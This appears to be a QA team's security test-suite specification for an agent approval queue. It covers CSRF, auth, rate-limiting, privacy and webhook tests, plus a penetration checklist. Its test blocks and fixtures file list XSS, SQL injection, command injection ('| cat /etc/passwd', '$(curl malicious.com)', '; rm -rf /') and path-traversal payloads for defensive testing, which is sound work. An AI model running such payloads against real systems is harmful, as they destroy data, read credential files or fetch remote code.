# Security Test Suite - Agent SDK & Approval Queue

**Version**: 1.0  
**Date**: 2025-10-11  
**Owner**: QA Team  
**Status**: Ready for Implementation

---

## Executive Summary

This document defines the security testing requirements and procedures for the Agent SDK approval queue integration. Security testing validates CSRF protection, authentication/authorization, input validation, rate limiting, and data privacy controls.

**Security Philosophy**: Defense in depth with multiple validation layers - never trust client input, always verify authorization, log security events.

---

## Security Test Scenarios

### 1. CSRF (Cross-Site Request Forgery) Protection

#### Test Coverage
- ✅ POST endpoints require CSRF token
- ✅ Valid CSRF tokens accepted
- ✅ Invalid/expired CSRF tokens rejected
- ✅ CSRF tokens are session-specific
- ✅ CSRF tokens rotate after use

#### Implementation
```typescript
describe('CSRF Protection', () => {
  test('should reject approve request without CSRF token', async () => {
    const response = await fetch('http://localhost:3000/api/approvals/approve', {
      method: 'POST',
      body: JSON.stringify({ queueItemId: 'test-123' }),
      headers: { 'Content-Type': 'application/json' }
    });
    
    expect(response.status).toBe(403);
    const body = await response.json();
    expect(body.error).toBe('CSRF token missing or invalid');
  });

  test('should accept approve request with valid CSRF token', async () => {
    const session = await createTestSession();
    const csrfToken = await getCSRFToken(session);
    
    const response = await fetch('http://localhost:3000/api/approvals/approve', {
      method: 'POST',
      body: JSON.stringify({ queueItemId: 'test-123' }),
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
        'Cookie': `session=${session}`
      }
    });
    
    expect(response.status).not.toBe(403);
  });

  test('should reject expired CSRF token', async () => {
    const expiredToken = generateExpiredCSRFToken();
    
    const response = await fetch('http://localhost:3000/api/approvals/approve', {
      method: 'POST',
      body: JSON.stringify({ queueItemId: 'test-123' }),
      headers: {
        'X-CSRF-Token': expiredToken
      }
    });
    
    expect(response.status).toBe(403);
    const body = await response.json();
    expect(body.error).toContain('expired');
  });
});
```

---

### 2. Authentication & Authorization

#### Test Coverage
- ✅ Unauthenticated users cannot access approval endpoints
- ✅ Authenticated users can view pending queue items
- ✅ Operators cannot modify items claimed by others
- ✅ Operators can only view their own reviewed items
- ✅ RLS policies enforce data isolation

#### Implementation
```typescript
describe('Authentication & Authorization', () => {
  test('should require authentication for queue endpoint', async () => {
    const response = await fetch('http://localhost:3000/api/approvals/queue');
    
    expect(response.status).toBe(401);
    const body = await response.json();
    expect(body.error).toBe('Authentication required');
  });

  test('should prevent operator from approving claimed item', async () => {
    // Operator 1 claims item
    await supabase
      .from('agent_sdk_approval_queue')
      .update({ operator_id: 'operator-1-uuid' })
      .eq('id', 'claimed-item');
    
    // Operator 2 tries to approve
    const response = await fetch('http://localhost:3000/api/approvals/approve', {
      method: 'POST',
      body: JSON.stringify({ queueItemId: 'claimed-item' }),
      headers: authHeaders('operator-2-uuid')
    });
    
    expect(response.status).toBe(403);
    const body = await response.json();
    expect(body.error).toBe('Item already claimed by another operator');
  });

  test('should enforce RLS policies on queue queries', async () => {
    // Seed queue with items for different operators
    await seedApprovalQueue([
      { id: 'pending-1', status: 'pending', operator_id: null },
      { id: 'approved-1', status: 'approved', operator_id: 'operator-1' },
      { id: 'approved-2', status: 'approved', operator_id: 'operator-2' }
    ]);
    
    // Operator 1 queries queue
    const { data } = await supabase
      .from('agent_sdk_approval_queue')
      .select('*')
      .auth('operator-1-token');
    
    // Should see: all pending + only their own approved items
    expect(data).toHaveLength(2); // pending-1, approved-1
    expect(data.map(d => d.id)).toContain('pending-1');
    expect(data.map(d => d.id)).toContain('approved-1');
    expect(data.map(d => d.id)).not.toContain('approved-2');
  });
});
```

---

### 3. Input Validation & Sanitization

#### Attack Vectors
1. **XSS (Cross-Site Scripting)**
2. **SQL Injection**
3. **Command Injection**
4. **Path Traversal**
5. **HTML Injection**
6. **LDAP Injection**

#### Test Coverage
- ✅ All user inputs sanitized before storage
- ✅ HTML stripped from edited responses before sending to Chatwoot
- ✅ SQL injection prevented in filters
- ✅ Command injection prevented in escalation notes
- ✅ Path traversal prevented in file operations
- ✅ Special characters escaped in database queries

#### XSS Protection Tests
```typescript
describe('XSS Protection', () => {
  const XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert("xss")>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<svg/onload=alert("xss")>',
    '<iframe src="javascript:alert(\'xss\')">',
    '<body onload=alert("xss")>',
    '<input onfocus=alert("xss") autofocus>',
    '<select onfocus=alert("xss") autofocus>',
    '<textarea onfocus=alert("xss") autofocus>',
    '<marquee onstart=alert("xss")>',
    '<object data="data:text/html,<script>alert(\'xss\')</script>">'
  ];

  XSS_PAYLOADS.forEach((payload) => {
    test(`should sanitize XSS payload: ${payload.substring(0, 30)}...`, async () => {
      const response = await POST('/api/approvals/edit-approve', {
        queueItemId: 'xss-test',
        editedResponse: payload
      });
      
      expect(response.status).toBe(200);
      
      // Verify sanitized version sent to Chatwoot
      const sentContent = mockChatwootAPI.sendReply.mock.calls[0][1];
      expect(sentContent).not.toContain('<script>');
      expect(sentContent).not.toContain('onerror');
      expect(sentContent).not.toContain('javascript:');
    });
  });

  test('should preserve safe HTML entities', async () => {
    const safeContent = 'Price: $100 &amp; free shipping (3-5 days)';
    
    const response = await POST('/api/approvals/edit-approve', {
      queueItemId: 'safe-test',
      editedResponse: safeContent
    });
    
    const sentContent = mockChatwootAPI.sendReply.mock.calls[0][1];
    expect(sentContent).toBe(safeContent);
  });
});
```

#### SQL Injection Protection Tests
```typescript
describe('SQL Injection Protection', () => {
  const SQL_PAYLOADS = [
    "'; DROP TABLE agent_sdk_approval_queue; --",
    "' OR '1'='1",
    "1' UNION SELECT * FROM users--",
    "' OR 1=1--",
    "admin'--",
    "' OR 'x'='x",
    "1'; DELETE FROM agent_sdk_approval_queue WHERE '1'='1",
    "' UNION SELECT NULL, NULL, NULL--"
  ];

  SQL_PAYLOADS.forEach((payload) => {
    test(`should prevent SQL injection: ${payload}`, async () => {
      const response = await GET(`/api/approvals/queue?priority=${encodeURIComponent(payload)}`);
      
      expect(response.status).toBe(400);
      const body = await response.json();
      expect(body.error).toBe('Invalid filter value');
      
      // Verify database not affected
      const tableCheck = await supabase
        .from('agent_sdk_approval_queue')
        .select('count');
      expect(tableCheck.error).toBeNull();
    });
  });

  test('should use parameterized queries for all database operations', async () => {
    // This is more of a code review check, but we can verify behavior
    const maliciousId = "' OR '1'='1";
    
    const response = await POST('/api/approvals/approve', {
      queueItemId: maliciousId
    });
    
    // Should fail validation, not execute SQL
    expect(response.status).toBe(400);
    expect(response.body.error).toContain('Invalid queue item ID');
  });
});
```

#### Command Injection Protection Tests
```typescript
describe('Command Injection Protection', () => {
  const COMMAND_PAYLOADS = [
    '; ls -la',
    '| cat /etc/passwd',
    '`whoami`',
    '$(curl malicious.com)',
    '; rm -rf /',
    '&& echo hacked',
    '|| id',
    '; cat /etc/passwd #'
  ];

  COMMAND_PAYLOADS.forEach((payload) => {
    test(`should prevent command injection: ${payload}`, async () => {
      const response = await POST('/api/approvals/escalate', {
        queueItemId: 'cmd-test',
        operatorNotes: payload
      });
      
      expect(response.status).toBe(200);
      
      // Verify notes stored safely (escaped)
      const { data } = await supabase
        .from('agent_sdk_approval_queue')
        .select('operator_notes')
        .eq('id', 'cmd-test')
        .single();
      
      // Notes should be stored as plain text, not executed
      expect(data.operator_notes).toBe(payload);
    });
  });
});
```

---

### 4. Rate Limiting & DoS Protection

#### Test Coverage
- ✅ Webhook endpoint rate limited (100 req/min per IP)
- ✅ Approval actions rate limited (60 req/min per operator)
- ✅ Queue queries rate limited (120 req/min per operator)
- ✅ Burst allowance for legitimate spikes
- ✅ Rate limit headers returned (X-RateLimit-*)

#### Implementation
```typescript
describe('Rate Limiting', () => {
  test('should rate limit webhook endpoint (100 req/min)', async () => {
    const payload = mockChatwootMessageCreated();
    const signature = validSignature(payload);
    
    // Send 101 requests rapidly
    const promises = Array.from({ length: 101 }, () =>
      fetch('http://localhost:54321/functions/v1/chatwoot-webhook', {
        method: 'POST',
        body: JSON.stringify(payload),
        headers: {
          'Content-Type': 'application/json',
          'X-Chatwoot-Signature': signature
        }
      })
    );
    
    const responses = await Promise.all(promises);
    const rateLimited = responses.filter(r => r.status === 429);
    
    expect(rateLimited.length).toBeGreaterThan(0);
    
    // Check rate limit headers
    const limitedResponse = rateLimited[0];
    expect(limitedResponse.headers.get('X-RateLimit-Limit')).toBe('100');
    expect(limitedResponse.headers.get('X-RateLimit-Remaining')).toBe('0');
    expect(limitedResponse.headers.get('Retry-After')).toBeDefined();
  });

  test('should allow burst within sliding window', async () => {
    // Send 10 requests immediately (burst)
    const burst = Array.from({ length: 10 }, () =>
      POST('/api/approvals/queue')
    );
    
    const responses = await Promise.all(burst);
    const success = responses.filter(r => r.status === 200);
    
    // All should succeed (within burst allowance)
    expect(success.length).toBe(10);
  });

  test('should reset rate limit after window expires', async () => {
    // Exhaust rate limit
    await exhaustRateLimit('/api/approvals/queue');
    
    // Wait for window to expire (60 seconds)
    await new Promise(resolve => setTimeout(resolve, 61000));
    
    // Should be able to make requests again
    const response = await POST('/api/approvals/queue');
    expect(response.status).not.toBe(429);
  });

  test('should rate limit per operator (not global)', async () => {
    // Operator 1 exhausts their limit
    await exhaustRateLimit('/api/approvals/queue', 'operator-1');
    
    // Operator 2 should still be able to make requests
    const response = await POST('/api/approvals/queue', {}, 'operator-2');
    expect(response.status).not.toBe(429);
  });
});
```

---

### 5. Data Privacy & Secrets Protection

#### Test Coverage
- ✅ No secrets in application logs
- ✅ PII redacted in error responses
- ✅ Customer emails masked in public logs
- ✅ Operator cannot view other operators' private data
- ✅ Webhook payloads sanitized before logging

#### Implementation
```typescript
describe('Data Privacy', () => {
  test('should not expose secrets in logs', async () => {
    process.env.CHATWOOT_TOKEN = 'secret-token-12345';
    process.env.SUPABASE_SERVICE_KEY = 'secret-key-67890';
    
    // Trigger an error that logs context
    await POST('/functions/v1/chatwoot-webhook', {
      body: 'invalid-payload'
    });
    
    // Read application logs
    const logs = await readLogs('chatwoot-webhook');
    
    expect(logs).not.toContain('secret-token-12345');
    expect(logs).not.toContain('secret-key-67890');
    expect(logs).toContain('[REDACTED]');
  });

  test('should redact PII in error responses', async () => {
    const payload = mockChatwootMessageCreated({
      sender: {
        name: 'John Doe',
        email: 'john.doe@example.com',
        phone: '+1-555-123-4567'
      }
    });
    
    // Trigger error
    const response = await POST('/functions/v1/chatwoot-webhook', {
      body: payload,
      headers: { 'X-Chatwoot-Signature': 'invalid' }
    });
    
    const body = await response.json();
    
    // Error should not contain PII
    expect(JSON.stringify(body)).not.toContain('john.doe@example.com');
    expect(JSON.stringify(body)).not.toContain('+1-555-123-4567');
  });

  test('should mask customer email in operator-facing logs', async () => {
    await POST('/api/approvals/approve', {
      queueItemId: 'privacy-test'
    }, 'operator-1');
    
    const logs = await readLogs('approval-queue');
    
    // Email should be masked: j***@example.com
    expect(logs).toMatch(/[a-z]\*\*\*@[a-z]+\.[a-z]+/);
    expect(logs).not.toContain('john.doe@example.com');
  });

  test('should prevent operators from viewing others private actions', async () => {
    // Operator 1 rejects item with private notes
    await POST('/api/approvals/reject', {
      queueItemId: 'private-test',
      reason: 'factually_incorrect',
      notes: 'Operator 1 private notes here'
    }, 'operator-1');
    
    // Operator 2 tries to view rejected items
    const { data } = await supabase
      .from('agent_sdk_approval_queue')
      .select('operator_notes')
      .eq('id', 'private-test')
      .auth('operator-2-token');
    
    // RLS should prevent access to other operator's items
    expect(data).toBeNull();
  });
});
```

---

### 6. Webhook Security

#### Test Coverage
- ✅ Signature verification prevents unauthorized webhooks
- ✅ Replay attacks prevented (timestamp validation)
- ✅ Webhook signature rotation supported
- ✅ Malformed payloads rejected gracefully
- ✅ Webhook rate limiting enforced

#### Implementation
```typescript
describe('Webhook Security', () => {
  test('should reject webhook without signature', async () => {
    const payload = mockChatwootMessageCreated();
    
    const response = await POST('/functions/v1/chatwoot-webhook', {
      body: payload
    });
    
    expect(response.status).toBe(401);
    const body = await response.json();
    expect(body.error).toBe('Missing webhook signature');
  });

  test('should prevent replay attacks (timestamp validation)', async () => {
    const oldPayload = mockChatwootMessageCreated({
      created_at: '2025-10-10T10:00:00Z' // 24 hours ago
    });
    const signature = validSignature(oldPayload);
    
    const response = await POST('/functions/v1/chatwoot-webhook', {
      body: oldPayload,
      headers: { 'X-Chatwoot-Signature': signature }
    });
    
    expect(response.status).toBe(400);
    const body = await response.json();
    expect(body.error).toContain('Timestamp too old');
  });

  test('should handle webhook signature rotation', async () => {
    const oldSecret = 'old-webhook-secret';
    const newSecret = 'new-webhook-secret';
    
    // Accept webhooks with new signature
    const payload = mockChatwootMessageCreated();
    const newSignature = generateHmacSignature(payload, newSecret);
    
    const response = await POST('/functions/v1/chatwoot-webhook', {
      body: payload,
      headers: { 'X-Chatwoot-Signature': newSignature }
    });
    
    expect(response.status).toBe(200);
  });

  test('should reject malformed webhook payload', async () => {
    const malformed = {
      event: 'message_created'
      // Missing required fields: conversation, message, sender
    };
    const signature = validSignature(malformed);
    
    const response = await POST('/functions/v1/chatwoot-webhook', {
      body: malformed,
      headers: { 'X-Chatwoot-Signature': signature }
    });
    
    expect(response.status).toBe(400);
    const body = await response.json();
    expect(body.error).toContain('Invalid payload structure');
  });
});
```

---

## Security Requirements Documentation

### Authentication Requirements
- **Method**: Supabase Auth with JWT tokens
- **Token Lifetime**: 1 hour (refresh required)
- **Session Storage**: HTTP-only cookies
- **MFA**: Recommended for production operators
- **Password Policy**: Min 12 chars, complexity required

### Authorization Model
- **Role**: `operator` (default for all support staff)
- **Permissions**:
  - `approvals:view` - View pending queue items
  - `approvals:approve` - Approve drafts
  - `approvals:edit` - Edit and approve drafts
  - `approvals:escalate` - Escalate to senior support
  - `approvals:reject` - Reject drafts

### RLS Policies Required
```sql
-- Operators can view pending queue items
CREATE POLICY "Operators can view pending queue"
ON agent_sdk_approval_queue
FOR SELECT
TO authenticated
USING (status = 'pending' OR operator_id = auth.uid());

-- Operators can update items they claim
CREATE POLICY "Operators can update claimed items"
ON agent_sdk_approval_queue
FOR UPDATE
TO authenticated
USING (status = 'pending')
WITH CHECK (operator_id = auth.uid());

-- Operators can insert learning feedback
CREATE POLICY "Operators can create feedback"
ON agent_sdk_learning_data
FOR INSERT
TO authenticated
WITH CHECK (true);

-- Operators can view their own notifications
CREATE POLICY "Operators can view own notifications"
ON agent_sdk_notifications
FOR SELECT
TO authenticated
USING (recipient_user_id = auth.uid() OR recipient_user_id IS NULL);
```

### Input Validation Rules

| Field | Validation | Sanitization |
|-------|-----------|--------------|
| `customer_message` | Max 10,000 chars | Strip HTML, escape special chars |
| `draft_response` | Max 5,000 chars | Strip HTML, preserve newlines |
| `edited_response` | Max 5,000 chars, not empty | Strip HTML, preserve newlines |
| `operator_notes` | Max 1,000 chars | Escape special chars, prevent injection |
| `escalation_reason` | Max 500 chars | Escape special chars |
| `conversation_id` | Integer, positive | Cast to integer |
| `queue_item_id` | UUID format | Validate UUID pattern |
| `confidence_score` | Integer 0-100 | Clamp to range |

### Security Headers Required
```yaml
Content-Security-Policy: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

---

## Penetration Test Checklist

### Pre-Test Setup
- [ ] Deploy to isolated test environment
- [ ] Seed with realistic test data
- [ ] Enable comprehensive logging
- [ ] Backup database before testing
- [ ] Notify team of pen-test window

### Manual Penetration Tests

#### 1. Authentication Bypass Attempts
- [ ] Try accessing /app/approvals without authentication
- [ ] Try forging JWT tokens
- [ ] Try session fixation attacks
- [ ] Try brute force login (if login UI exists)
- [ ] Try default credentials

#### 2. Authorization Escalation
- [ ] Try approving items claimed by other operators
- [ ] Try viewing other operators' rejected items
- [ ] Try modifying learning data
- [ ] Try deleting queue items
- [ ] Try accessing admin-only endpoints

#### 3. Injection Attacks
- [ ] Test all XSS payloads from OWASP list
- [ ] Test SQL injection in all input fields
- [ ] Test command injection in escalation notes
- [ ] Test LDAP injection (if applicable)
- [ ] Test XML injection (if applicable)

#### 4. Business Logic Flaws
- [ ] Try approving same item twice (race condition)
- [ ] Try negative confidence scores
- [ ] Try duplicate conversation_id
- [ ] Try extremely long text fields (DoS)
- [ ] Try invalid status transitions

#### 5. API Security
- [ ] Test CORS configuration
- [ ] Test OPTIONS requests
- [ ] Test malformed JSON payloads
- [ ] Test oversized payloads (>10MB)
- [ ] Test missing Content-Type header

#### 6. Webhook Security
- [ ] Try webhooks without signature
- [ ] Try webhooks with wrong signature
- [ ] Try replay attacks (old timestamps)
- [ ] Try webhook flooding
- [ ] Try webhook with malicious URLs

### Automated Security Scanning

#### OWASP ZAP Scan
```bash
# Run OWASP ZAP automated scan
docker run -v $(pwd):/zap/wrk/:rw \
  -t zaproxy/zap-stable \
  zap-baseline.py \
  -t http://host.docker.internal:3000 \
  -r zap-report.html
```

#### npm audit
```bash
# Check for known vulnerabilities
npm audit --production
npm audit --audit-level=moderate
```

#### Snyk Security Scan
```bash
# Scan dependencies and code
npx snyk test
npx snyk code test
```

### Post-Test Actions
- [ ] Review all logged security events
- [ ] Document all vulnerabilities found
- [ ] Classify by severity (Critical/High/Medium/Low)
- [ ] Create remediation tickets with CVSS scores
- [ ] Re-test after fixes applied
- [ ] Generate security audit report

---

## Security Test Data

### Test User Accounts
```yaml
operator-1:
  id: "11111111-1111-1111-1111-111111111111"
  email: "operator1@test.local"
  role: "operator"
  permissions: [approvals:view, approvals:approve, approvals:edit]

operator-2:
  id: "22222222-2222-2222-2222-222222222222"
  email: "operator2@test.local"
  role: "operator"
  permissions: [approvals:view, approvals:approve]

admin-1:
  id: "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"
  email: "admin@test.local"
  role: "admin"
  permissions: [*]
```

### Malicious Test Payloads

**File**: `tests/fixtures/security-payloads.ts`
```typescript
export const XSS_PAYLOADS = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert("xss")>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<svg/onload=alert("xss")>',
  '<iframe src="javascript:alert(\'xss\')">',
  '<body onload=alert("xss")>',
  '<input onfocus=alert("xss") autofocus>',
  '<object data="data:text/html,<script>alert(\'xss\')</script>">'
];

export const SQL_INJECTION_PAYLOADS = [
  "'; DROP TABLE agent_sdk_approval_queue; --",
  "' OR '1'='1",
  "1' UNION SELECT * FROM users--",
  "' OR 1=1--",
  "admin'--",
  "1'; DELETE FROM agent_sdk_approval_queue WHERE '1'='1"
];

export const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(curl malicious.com)',
  '; rm -rf /',
  '&& echo hacked'
];

export const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
];
```

---

## Security Requirements

### OWASP Top 10 Coverage

| Vulnerability | Mitigation | Test Coverage |
|---------------|-----------|---------------|
| A01: Broken Access Control | RLS policies, operator auth | ✅ Auth tests |
| A02: Cryptographic Failures | HMAC webhook signatures | ✅ Webhook tests |
| A03: Injection | Input sanitization, parameterized queries | ✅ Injection tests |
| A04: Insecure Design | Human-in-the-loop approval | ✅ Workflow tests |
| A05: Security Misconfiguration | Security headers, CSP | ✅ Header tests |
| A06: Vulnerable Components | npm audit, Snyk scanning | ✅ Dependency tests |
| A07: Authentication Failures | Supabase Auth, JWT validation | ✅ Auth tests |
| A08: Data Integrity Failures | Webhook signatures, CSRF tokens | ✅ Integrity tests |
| A09: Logging Failures | Structured logging, PII redaction | ✅ Logging tests |
| A10: Server-Side Request Forgery | No user-controlled URLs | ✅ SSRF tests |

### Compliance Requirements

#### GDPR (EU Data Protection)
- ✅ PII encrypted at rest (Supabase encryption)
- ✅ PII masked in logs
- ✅ Right to deletion (cleanup scripts)
- ✅ Data retention policies documented
- ✅ Audit logs for all PII access

#### SOC 2 (Security Controls)
- ✅ Access controls (RLS policies)
- ✅ Encryption in transit (HTTPS only)
- ✅ Encryption at rest (Supabase)
- ✅ Audit logging (observability_logs)
- ✅ Change management (git protocol)
- ✅ Incident response plan (runbooks)

#### PCI-DSS (If Processing Payments)
- ⚠️ No credit card data in logs
- ⚠️ Secure transmission (HTTPS)
- ⚠️ Access logging
- ⚠️ Regular security testing

---

## Security Monitoring

### Security Event Logging

**Events to Log**:
```typescript
enum SecurityEvent {
  INVALID_WEBHOOK_SIGNATURE = 'security.webhook.invalid_signature',
  AUTHENTICATION_FAILURE = 'security.auth.failure',
  AUTHORIZATION_DENIED = 'security.authz.denied',
  RATE_LIMIT_EXCEEDED = 'security.rate_limit.exceeded',
  XSS_ATTEMPT_DETECTED = 'security.injection.xss',
  SQL_INJECTION_ATTEMPT = 'security.injection.sql',
  COMMAND_INJECTION_ATTEMPT = 'security.injection.command',
  SUSPICIOUS_INPUT = 'security.input.suspicious',
  CSRF_TOKEN_INVALID = 'security.csrf.invalid'
}
```

**Log Format**:
```json
{
  "timestamp": "2025-10-11T15:30:00Z",
  "event": "security.webhook.invalid_signature",
  "severity": "warning",
  "ip_address": "203.0.113.42",
  "user_id": null,
  "details": {
    "endpoint": "/functions/v1/chatwoot-webhook",
    "signature_provided": "[REDACTED]",
    "payload_hash": "sha256:abc123..."
  },
  "action_taken": "rejected_request"
}
```

### Alerting Rules
```yaml
# Alert on critical security events
- name: Invalid Webhook Signatures
  condition: >5 invalid signatures in 5 minutes
  severity: high
  notify: [security-team, on-call]

- name: Authentication Failures
  condition: >10 auth failures from same IP in 1 minute
  severity: critical
  notify: [security-team, on-call]
  action: block_ip_temp

- name: Injection Attempts
  condition: Any XSS/SQL/Command injection detected
  severity: critical
  notify: [security-team, engineering]
  action: log_incident

- name: Rate Limit Abuse
  condition: Same IP hits rate limit >50 times/hour
  severity: medium
  notify: [ops-team]
  action: consider_permanent_block
```

---

## Penetration Testing Schedule

### Regular Testing Cadence
- **Weekly**: Automated security scans (npm audit, OWASP ZAP)
- **Monthly**: Internal penetration testing (QA team)
- **Quarterly**: External penetration testing (3rd party)
- **Ad-hoc**: After major feature releases

### Penetration Test Report Template

```markdown
# Penetration Test Report

**Date**: YYYY-MM-DD
**Tester**: Name
**Environment**: Staging/Production
**Scope**: Agent SDK Approval Queue

## Executive Summary
- Tests Executed: XX
- Vulnerabilities Found: XX
- Critical: XX | High: XX | Medium: XX | Low: XX

## Vulnerabilities

### 1. [Vulnerability Title]
**Severity**: Critical/High/Medium/Low
**CVSS Score**: X.X
**Description**: ...
**Reproduction Steps**: ...
**Impact**: ...
**Remediation**: ...
**Timeline**: Immediate/1 week/1 month

## Positive Findings
- [Security control that worked well]

## Recommendations
1. [Recommendation 1]
2. [Recommendation 2]

## Conclusion
Overall security posture: Excellent/Good/Fair/Poor
```

---

## Security Incident Response

### Incident Classification
1. **P0 (Critical)**: Active exploit, data breach, unauthorized access
2. **P1 (High)**: Vulnerability with exploit available, auth bypass
3. **P2 (Medium)**: Vulnerability without known exploit
4. **P3 (Low)**: Minor security improvement

### Response Procedures

**P0 Incident**:
1. Immediately notify security team and manager
2. Isolate affected systems
3. Enable verbose logging
4. Collect forensic evidence
5. Apply emergency patch
6. Post-mortem within 24 hours

**P1 Incident**:
1. Notify security team within 1 hour
2. Schedule patch within 48 hours
3. Test patch thoroughly
4. Deploy to production
5. Document in incident log

---

## Security Test Automation

### Pre-Commit Hooks
```bash
# .husky/pre-commit
#!/bin/sh

# Run secret scanning
if command -v gitleaks &> /dev/null; then
  gitleaks protect --staged --verbose
fi

# Check for common security issues
npm run lint:security
```

### CI Security Pipeline
```yaml
# .github/workflows/security.yml
name: Security Checks

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run npm audit
        run: npm audit --audit-level=moderate
      
      - name: Run Snyk security scan
        run: npx snyk test --severity-threshold=high
      
      - name: Run gitleaks secret scan
        run: |
          docker run -v $(pwd):/scan ghcr.io/gitleaks/gitleaks:latest \
            detect --source /scan --verbose
      
      - name: Run OWASP dependency check
        run: npx dependency-check --project HotDash --scan ./
```

---

**End of Security Test Suite Documentation**

**Implementation Priority**:
- Week 1: Security test stubs (DONE in Task 3)
- Week 1: RLS policies validation
- Week 2: Input validation tests
- Week 2: Penetration test checklist execution
- Week 3: Security monitoring setup

**Coordination**: Tag @engineer when security fixes are needed

